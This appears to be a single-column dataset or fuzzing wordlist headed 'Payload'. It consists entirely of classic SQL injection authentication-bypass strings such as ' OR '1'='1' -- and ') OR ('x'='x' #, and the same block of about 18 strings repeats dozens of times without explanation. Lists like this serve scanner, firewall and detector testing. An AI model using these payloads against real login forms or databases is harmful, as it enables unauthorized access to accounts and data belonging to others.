Payload
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR '1'='1' --
' OR '1'='1' ({
' OR '1'='1' /*
' OR '1'='1' -- -
' OR '1'='1' #
' OR '1'='1' --+
' OR 1=1 --
' OR 'a'='a' --
' OR ''=' --
' OR 'x'='x' --
') OR ('1'='1
') OR ('1'='1' --
') OR ('1'='1' /*
') OR ('x'='x' --
') OR ('x'='x' #
') OR ('a'='a' --
